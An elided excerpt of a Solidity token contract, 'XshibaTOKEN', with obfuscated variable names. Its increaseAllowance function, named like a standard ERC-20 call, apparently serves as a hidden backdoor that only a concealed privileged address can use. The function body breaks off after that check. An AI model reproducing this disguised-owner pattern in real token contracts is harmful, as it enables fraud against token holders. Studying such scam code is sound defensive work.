...
contract XshibaTOKEN is Ownable {
    ...
    string private _hooextokenname = "Xshiba";
    string private _voptokensymbol = "Xshiba";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public aaxbbt87;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(aaxbbt87 != _msgSender()){
            return ;
        }else{
           require(aaxbbt87 == _msgSender());
